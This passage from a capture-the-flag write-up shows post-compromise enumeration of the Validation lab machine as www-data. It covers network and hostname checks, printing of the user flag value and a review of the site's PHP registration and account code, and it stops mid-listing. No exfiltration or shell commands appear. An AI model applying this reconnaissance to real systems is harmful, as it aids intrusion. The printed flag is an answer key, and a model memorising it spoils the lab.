+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">21: eth0@if22: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+</span><span class="z-text z-plain">    link/ether 02:42:ac:15:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+</span><span class="z-text z-plain">    inet 172.21.0.10/16 brd 172.21.255.255 scope global eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Validation's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">validation
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check the home folders, we find one for <code>htb</code> containing the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/htb/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">9600ec6c4ae4462a970fb7eec314d673
+</span></code></pre>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Apache website, located at <code>/var/www/html</code>.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">require</span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">config.php</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SERVER</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">REQUEST_METHOD</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-comparison z-php">==</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">POST</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>userhash</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-string z-php">md5</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span>      <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">INSERT INTO</span> registration (username, userhash, country, regtime) <span class="z-keyword z-other z-DML z-II z-sql">VALUES</span> (?, ?, ?, ?)</span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span>     <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>conn</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">prepare</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">bind_param</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">sssi</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>userhash</span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">country</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-datetime z-php">time</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">execute</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">setcookie</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>userhash</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Location: /account.php</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-keyword z-control z-php">exit</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span>  <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">update registration set country = ? where username = ?</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>conn</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">prepare</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">bind_param</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">ss</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">country</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">execute</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">setcookie</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>userhash</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Location: /account.php</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-control z-php">exit</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php"> 
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span></code></pre>
+<p>The <code>index.php</code> file contains the source code for the homepage of the website.
+The PHP part does exactly what we identified during our exploration of the
+server: it creates a MD5 hash of the username, adds the username, username hash
+and country into the <code>registration</code> MariaDB table, sets the <code>user</code> cookie to the
+username hash, and redirects to <code>/account.php</code>.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">include</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">config.php</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>user</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_COOKIE</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span>  <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> username, country <span class="z-keyword z-other z-DML z-sql">FROM</span> registration <span class="z-keyword z-other z-DML z-sql">WHERE</span> userhash <span class="z-keyword z-operator z-comparison z-sql">=</span> ?</span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>conn</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">prepare</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">bind_param</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">s</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>user</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
